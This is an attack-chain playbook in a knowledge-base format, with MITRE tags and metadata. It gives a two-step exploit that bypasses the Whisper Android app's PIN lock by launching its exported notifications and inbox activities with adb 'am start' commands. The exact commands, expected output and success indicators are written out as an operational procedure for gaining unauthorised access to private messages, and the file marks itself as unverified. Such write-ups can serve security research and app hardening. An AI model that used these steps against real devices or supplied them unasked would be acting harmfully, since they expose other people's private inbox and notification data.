---
tags:
  - android
  - auth-bypass
  - exported-components
  - whisper-app
  - authentication-bypass
type: attack_chain
tools:
  - '[[tools/adb]]'
tactics:
  - '[[Initial Access]]'
  - '[[Defense Evasion]]'
verified: false
platforms:
  - Android
submitted: true
complexity: medium
created_at: '[TIMESTAMP]'
procedures:
  - '[[procedures/Identify-Exported-Android-Activities]]'
  - '[[procedures/Launch-Exported-Activities-for-Auth-Bypass]]'
step_count: 2
techniques:
  - '[[Valid Accounts]]'
  - '[[T1417]]'
updated_at: '2025-12-14T17:24:39.659Z'
description: >-
  Multi-stage attack exploiting improperly exported Android activities in the
  Whisper app to bypass 4-digit PIN authentication and access sensitive user
  data like notifications and inbox.
skill_level: intermediate
impact_level: high
id: 2ebf4bfe-6dbe-40d8-9b06-f82c42b3f8cd
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[T1417]]'
---
# Authentication Bypass via Improperly Exported Android Activities in Whisper App

Multi-stage attack chain demonstrating a complete attack workflow exploiting vulnerabilities in the Whisper Android app.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify Exported Components] --> B[Launch Activities for Bypass]
    B --> C[Access Sensitive Data]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/adb]]

### Target Environment

- Target OS/Platform: Android device with Whisper app installed (package: sh.whisper)
- Required services/ports: USB debugging enabled for ADB access; no network ports required
- Network access requirements: Local device access via USB or ADB over network

### Initial Access Requirements

- Credential requirements: None; physical or ADB access to the device
- Network position: Direct device access
- Prior access needed: Installed Whisper app on a rooted or debuggable device

## Detailed Attack Procedures

### Step 1: Identify Exported Activities
procedure: [[procedures/Identify-Exported-Android-Activities]]

**Objective**: Examine the app's manifest to discover exported sensitive activities that can be invoked externally.

**Instructions**: Use ADB to pull and inspect the AndroidManifest.xml or query the package manager for exported components. Connect the device via USB and enable debugging.

First, list all activities for the package:

```bash
adb shell pm dump sh.whisper | grep -A 20 "activity"
```

Look for activities like sh.whisper.WNotificationsActivity and sh.whisper.WInboxActivity with android:exported="true".

**Expected Output**: Output showing exported activities without restrictions.

**Success Indicators**:
- Exported activities identified, such as WNotificationsActivity and WInboxActivity
- Confirmation via manifest that no intent filters or permissions protect them

### Step 2: Launch Exported Activities for Auth Bypass
procedure: [[procedures/Launch-Exported-Activities-for-Auth-Bypass]]

**Objective**: Directly invoke the exported activities using intents to access protected features without PIN entry.

**Instructions**: From an external context like ADB shell or a malicious app, send intents to start the activities.

Use ADB to launch the notifications activity:

```bash
adb shell am start -n sh.whisper/.WNotificationsActivity
```

Similarly for inbox:

```bash
adb shell am start -n sh.whisper/.WInboxActivity
```

**Expected Output**: The activity launches directly, displaying notifications or inbox content without prompting for the 4-digit PIN.

**Success Indicators**:
- Sensitive data (inbox messages, notifications) visible without authentication
- No PIN prompt appears during activity launch

## Attack Chain Summary

### Key Achievements

1. Discovered improperly exported activities in Whisper app via manifest inspection
2. Bypassed 4-digit PIN authentication by directly launching activities with intents
3. Gained unauthorized access to user inbox and notifications, enabling data exposure on lost devices

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]]
- [[T1417]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Defense Evasion]]

---
*Last updated: [TIMESTAMP]*
